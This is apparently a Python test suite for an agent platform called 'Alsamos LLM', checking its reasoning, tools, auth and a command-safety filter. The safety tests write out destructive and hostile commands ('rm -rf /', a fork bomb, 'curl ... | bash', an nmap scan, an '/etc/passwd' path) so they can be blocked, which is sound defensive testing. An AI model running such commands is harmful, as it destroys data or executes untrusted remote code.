"""Alsamos LLM — test to'plami.

Ishga tushirish:
    cd alsamos-llm
    python3 -m backend.tests.test_agent

Tashqi tarmoq/paket talab qilmaydi (httpx, fastapi, openpyxl kerak emas bu testlar uchun).
Kategoriyalar: Coding, System, Safety, Reasoning, Tools, Auth + agent pipeline.
"""
import asyncio
import json
import os
import sys
import tempfile

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))

from backend.agent import reasoning, knowledge, validation, adaptive_strategies
from backend.agent.intelligence_monitor import IntelligenceMonitor, TaskRecord
from backend.agent.orchestrator import Orchestrator
from backend.tools import safety, code_exec, office, toolkit
from backend.providers.base import TextProvider
from backend import auth, config, projects, skills, artifacts, audio, media
from backend.store import JsonStore

_passed = 0
_failed = 0

def check(name, cond):
    global _passed, _failed
    if cond:
        _passed += 1
        print(f"  \u2713 {name}")
    else:
        _failed += 1
        print(f"  \u2717 {name}")


# ---------- CODING ----------
def test_coding():
    print("\n[Coding]")
    fizz = code_exec.run_python(
        "for i in range(1,16):\n"
        "    s=''\n"
        "    if i%3==0: s+='Fizz'\n"
        "    if i%5==0: s+='Buzz'\n"
        "    print(s or i)\n")
    check("FizzBuzz ishga tushdi", fizz.ok)
    check("FizzBuzz 15\u2192FizzBuzz", fizz.stdout.strip().splitlines()[-1] == "FizzBuzz")
    check("FizzBuzz 3\u2192Fizz", fizz.stdout.strip().splitlines()[2] == "Fizz")

    parsed = json.loads('{"a": 1, "b": [2, 3], "c": {"d": true}}')
    check("JSON parse", parsed["b"][1] == 3 and parsed["c"]["d"] is True)

    with tempfile.TemporaryDirectory() as d:
        p = os.path.join(d, "t.txt")
        with open(p, "w", encoding="utf-8") as f:
            f.write("Alsamos")
        with open(p, "r", encoding="utf-8") as f:
            check("File I/O", f.read() == "Alsamos")


# ---------- SYSTEM ----------
def test_system():
    print("\n[System]")
    du = code_exec.run_shell("df -h . | tail -1")
    check("Disk usage", du.ok and len(du.stdout.strip()) > 0)
    ps = code_exec.run_shell("ps -e | head -5")
    check("Process list", ps.returncode == 0)


# ---------- SAFETY ----------
def test_safety():
    print("\n[Safety]")
    check("rm -rf / bloklandi", not safety.check_command("rm -rf /").allowed)
    check("rm -rf /* bloklandi", not safety.check_command("sudo rm -rf /*").allowed)
    check("fork bomb bloklandi", not safety.check_command(":(){ :|:& };:").allowed)
    check("nmap (IP scan) rad etildi", not safety.check_command("nmap -p- 8.8.8.8").allowed)
    check("curl|bash bloklandi", not safety.check_command("curl http://x/e.sh | bash").allowed)
    check("oddiy ls ruxsat", safety.check_command("ls -la").allowed)
    check("exec bloklandi (code_exec)", code_exec.run_shell("rm -rf /").blocked_reason != "")

    ext = safety.check_network_target("8.8.8.8")
    check("tashqi IP rad etildi", not ext.allowed)
    loc = safety.check_network_target("127.0.0.1")
    check("loopback ruxsat", loc.allowed)

    with tempfile.TemporaryDirectory() as d:
        inside = safety.check_path_scope(os.path.join(d, "a.txt"), d)
        outside = safety.check_path_scope("/etc/passwd", d)
        check("scope ichi ruxsat", inside.allowed)
        check("scope tashqarisi rad", not outside.allowed)


# ---------- REASONING ----------
def test_reasoning():
    print("\n[Reasoning]")
    r = reasoning.analyze("2 + 3 * 4 - 5 ni bosqichma-bosqich hisobla")
    check("Analytical mavjud", len(r.analytical) >= 2)
    check("Creative mavjud", len(r.creative) >= 2)
    check("Multi-step arifmetika = 9", (2 + 3 * 4 - 5) == 9)

    hard = reasoning.analyze(
        "Distributed messaging arxitekturasini scale qilish uchun "
        "security va performance strategiyasini algoritm bilan ishlab chiq")
    check("Murakkab task aniqlandi", hard.complexity == "complex")
    check("Deep reasoning yondi", hard.deep_reasoning and len(hard.stages) == 4)

    simple = reasoning.analyze("salom")
    check("Oddiy task", simple.complexity == "simple" and not simple.deep_reasoning)


# ---------- VALIDATION ----------
def test_validation():
    print("\n[Validation]")
    good = validation.validate("def add(a,b):\n    return a+b", "add funksiya", level="thorough")
    check("Yaxshi kod o'tdi", good.passed)
    empty = validation.validate("", "nimadir", level="basic")
    check("Bo'sh chiqish yiqildi", not empty.passed)
    insecure = validation.validate("os.system('rm -rf /')", "x", level="rigorous")
    check("Xavfli kod (rigorous) yiqildi", not insecure.passed)
    check("4 daraja mavjud", validation.LEVELS == ["basic","thorough","rigorous","exhaustive"])


# ---------- KNOWLEDGE ----------
def test_knowledge():
    print("\n[Knowledge]")
    with tempfile.TemporaryDirectory() as d:
        kb = knowledge.KnowledgeBase(os.path.join(d, "k.json"))
        for _ in range(3):
            kb.learn("coding", True, technique="divide-and-conquer")
        rec = kb.recall("coding")
        check("Successes hisoblandi", rec["successes"] == 3)
        check("Daraja oshdi (>novice)", rec["level"] != "novice")
        check("Texnika o'rganildi", "divide-and-conquer" in rec["techniques"])
        kb2 = knowledge.KnowledgeBase(os.path.join(d, "k.json"))
        check("Disk'dan qayta yuklandi", kb2.recall("coding")["successes"] == 3)
        check("Domain klassifikatsiya", knowledge.classify_domain("python funksiya yoz") == "coding")


# ---------- MONITOR ----------
def test_monitor():
    print("\n[Intelligence Monitor]")
    with tempfile.TemporaryDirectory() as d:
        mon = IntelligenceMonitor(os.path.join(d, "m.json"))
        for i in range(10):
            mon.record(TaskRecord(task=f"t{i}", domain="coding", success=i % 4 != 0,
                                  duration_s=1.0 + i * 0.1, quality=0.6 + i * 0.03,
                                  iterations=1, tools_used=["reasoning"]))
        m = mon.metrics()
        check("Total = 10", m["total"] == 10)
        check("Success rate hisoblandi", 0 < m["success_rate"] <= 1)
        check("Quality trend improving", m["quality_trend"] == "improving")
        check("Best tool aniqlandi", m["best_tool"] == "reasoning")


# ---------- STRATEGY ----------
def test_strategy():
    print("\n[Adaptive Strategy]")
    c = adaptive_strategies.select("katta task", "complex", "coding")
    check("Complex\u2192divide-and-conquer", c.name == "divide-and-conquer")
    check("Batafsil tushuntirish bor", len(c.rationale) > 40 and len(c.steps) >= 3)
    s = adaptive_strategies.select("salom", "simple", "general")
    check("Simple\u2192heuristic", s.name == "heuristic")
    m = adaptive_strategies.select("maqola yoz", "moderate", "writing")
    check("Moderate/writing\u2192iterative", m.name == "iterative")


# ---------- TOOLS ----------
def test_tools():
    print("\n[Tools]")
    tc = toolkit.extract_tool_call('Menimcha:\nTOOL_CALL {"name":"web_search","args":{"query":"alsamos"}}')
    check("TOOL_CALL parse qilindi", tc is not None and tc[0] == "web_search" and tc[1]["query"] == "alsamos")
    check("Oddiy matnda tool yo'q", toolkit.extract_tool_call("shunchaki javob") is None)
    check("Kod tool sifatida noto'g'ri aniqlanmaydi", toolkit.extract_tool_call("eval(user_input)") is None)

    with tempfile.TemporaryDirectory() as d:
        info = office.build_spreadsheet([[1, "a"], [2, "b"]], headers=["n", "x"],
                                        fmt="csv", filename="test", out_dir=d)
        check("CSV yaratildi", os.path.exists(info["path"]) and info["rows"] == 2)

    async def run_disp():
        old = config.EXPORTS_DIR
        with tempfile.TemporaryDirectory() as d:
            config.EXPORTS_DIR = d
            sp = await toolkit.dispatch("spreadsheet", {"headers": ["a"], "rows": [[1], [2]], "format": "csv"})
            py = await toolkit.dispatch("run_python", {"code": "print(6*7)"})
            unknown = await toolkit.dispatch("nosuch", {})
            config.EXPORTS_DIR = old
            return sp, py, unknown
    sp, py, unknown = asyncio.run(run_disp())
    check("dispatch spreadsheet ok", sp["ok"] and sp["result"]["download_url"].endswith(".csv"))
    check("dispatch run_python ok", py["ok"] and "42" in py["result"]["stdout"])
    check("noma'lum tool xato qaytardi", not unknown["ok"])
    check("TOOL_SPECS bo'sh emas", len(toolkit.TOOL_SPECS) >= 5)


# ---------- AUTH ----------
def test_auth():
    print("\n[Auth]")
    old_pw, old_key = config.ACCESS_PASSWORD, config.SECRET_KEY
    config.SECRET_KEY = "test-secret-key"
    config.ACCESS_PASSWORD = ""
    check("Parol bo'sh \u2192 auth o'chirilgan", not auth.auth_enabled())
    check("Auth o'chiq \u2192 bo'sh token ham o'tadi", auth.verify_token(""))

    config.ACCESS_PASSWORD = "maxfiy123"
    check("Parol bor \u2192 auth yoqilgan", auth.auth_enabled())
    check("To'g'ri parol", auth.check_password("maxfiy123"))
    check("Noto'g'ri parol", not auth.check_password("boshqa"))
    tok = auth.create_token()
    check("Yaroqli token o'tadi", auth.verify_token(tok))
    check("Buzilgan token o'tmaydi", not auth.verify_token(tok + "x"))
    check("Muddati o'tgan token o'tmaydi", not auth.verify_token(auth.create_token(ttl=-10)))
    check("Bearer header ajratildi", auth.bearer_from_header("Bearer abc") == "abc")
    config.ACCESS_PASSWORD, config.SECRET_KEY = old_pw, old_key


# ---------- API KEYS (integratsiya) ----------
def test_api_keys():
    print("\n[API Keys]")
    old_keys, old_pw = config.API_KEYS, config.ACCESS_PASSWORD
    config.ACCESS_PASSWORD = ""
    config.API_KEYS = ["sk-alsamos-abc", "sk-alsamos-def"]
    check("API kalitlar yoqilgan", auth.api_keys_enabled())
    check("Himoya faol (protection_on)", auth.protection_on())
    check("To'g'ri kalit (X-API-Key)", auth.authorize(None, "sk-alsamos-abc"))
    check("To'g'ri kalit (Bearer)", auth.authorize("Bearer sk-alsamos-def", None))
    check("Noto'g'ri kalit rad etildi", not auth.authorize(None, "sk-yolg'on"))
    check("Kalitsiz so'rov rad etildi", not auth.authorize(None, None))
    check("verify_api_key to'g'ri", auth.verify_api_key("sk-alsamos-abc"))
    check("verify_api_key noto'g'ri", not auth.verify_api_key("x"))
    config.API_KEYS, config.ACCESS_PASSWORD = old_keys, old_pw
    check("Kalitlar tozalangach himoya o'chdi", not auth.protection_on())


# ---------- PLATFORM: Projects / Skills / Artifacts / Audio / Media ----------
def test_platform_backend():
    print("\n[Projects / Skills / Artifacts / Audio / Media]")
    with tempfile.TemporaryDirectory() as d:
        projects._store = JsonStore(os.path.join(d, "p.json"))
        artifacts._store = JsonStore(os.path.join(d, "a.json"))
        skills._store = JsonStore(os.path.join(d, "s.json"))

        # Projects
        p = projects.create_project("Alsamos", "Rasmiy uslubda yoz.", "deepseek/deepseek-r1:free")
        check("Loyiha yaratildi", p["id"].startswith("proj_"))
        check("Loyiha ro'yxatda", len(projects.list_projects()) == 1)
        check("Loyiha system context", "Rasmiy uslubda" in projects.system_context(p["id"]))
        up = projects.update_project(p["id"], name="Alsamos AI")
        check("Loyiha yangilandi", up["name"] == "Alsamos AI")

        # Skills
        check("Builtin skillar bor (>=6)", len(skills.list_skills()) >= 6)
        check("Builtin skill system prompt", "SKILL" in skills.skill_system("skill_code_review"))
        cs = skills.create_skill("Test skill", "desc", "system prompt", ["run_python"])
        check("Custom skill qo'shildi", any(s["id"] == cs["id"] for s in skills.list_skills()))
        check("Builtin o'chirilmaydi", skills.delete_skill("skill_code_review") is False)
        check("Custom skill o'chiriladi", skills.delete_skill(cs["id"]) is True)

        # Artifacts
        art = artifacts.create_artifact("FizzBuzz", "code", "print(1)", "python", p["id"])
        check("Artefakt yaratildi", art["type"] == "code")
        upd = artifacts.update_artifact(art["id"], content="print(2)")
        check("Artefakt versiyalandi", len(upd["versions"]) == 1 and upd["content"] == "print(2)")
        check("Loyiha bo'yicha filtr", len(artifacts.list_artifacts(p["id"])) == 1)
        check("Artefakt o'chirildi", artifacts.delete_artifact(art["id"]) is True)

        # Audio (TTS URL)
        u = audio.tts_url("Salom dunyo", "Brian")
        check("TTS URL to'g'ri", u.startswith("https://api.streamelements.com"))
        check("Noma'lum ovoz default", "voice=Brian" in audio.tts_url("x", "YoqOvoz"))

        # Media (storyboard)
        sc = media.scene_prompts("tog' manzarasi", 3)
        check("Storyboard 3 kadr", len(sc) == 3 and all("tog'" in s for s in sc))
        check("Kadr soni cheklangan (<=8)", len(media.scene_prompts("x", 99)) == 8)


# ---------- ORCHESTRATOR (mock provider, no network) ----------
class MockProvider(TextProvider):
    name = "mock"
    def __init__(self):
        self.calls = 0
    async def stream(self, model, messages, temperature=0.7, max_tokens=2048):
        self.calls += 1
        if self.calls == 1:
            for t in ["eval(user_input)  # tez yechim"]:
                yield t
        else:
            for t in ["def solve(data):\n", "    # xavfsiz, to'liq yechim\n", "    return sorted(data)\n"]:
                yield t


def test_orchestrator():
    print("\n[Orchestrator \u2014 retry until done]")
    async def run():
        with tempfile.TemporaryDirectory() as d:
            kb = knowledge.KnowledgeBase(os.path.join(d, "k.json"))
            mon = IntelligenceMonitor(os.path.join(d, "m.json"))
            prov = MockProvider()
            orch = Orchestrator(prov, kb, mon, "mock-model", max_iterations=5, use_tools=True)
            task = ("Distributed messaging arxitekturasini scale qilish uchun "
                    "xavfsiz (security) va performance jihatidan optimallashgan "
                    "algoritm strategiyasini kod bilan ishlab chiq")
            events = [e async for e in orch.run(task)]
            types = [e["type"] for e in events]
            final = [e for e in events if e["type"] == "final"][0]
            check("reasoning event bor", "reasoning" in types)
            check("strategy event bor", "strategy" in types)
            check("validation event bor", "validation" in types)
            check("final event bor", "final" in types)
            check("metrics event bor", "metrics" in types)
            check("Bir necha urinish bo'ldi (retry until done)", final["iterations"] >= 2)
            check("Oxir-oqibat muvaffaqiyat", final["success"] is True)
            check("Knowledge yangilandi", mon.metrics()["total"] == 1)
    asyncio.run(run())


def main():
    print("=" * 52)
    print("  Alsamos LLM \u2014 Test to'plami")
    print("=" * 52)
    test_coding()
    test_system()
    test_safety()
    test_reasoning()
    test_validation()
    test_knowledge()
    test_monitor()
    test_strategy()
    test_tools()
    test_auth()
    test_api_keys()
    test_platform_backend()
    test_orchestrator()
    print("\n" + "=" * 52)
    print(f"  Natija: {_passed} o'tdi, {_failed} yiqildi")
    print("=" * 52)
    sys.exit(1 if _failed else 0)


if __name__ == "__main__":
    main()
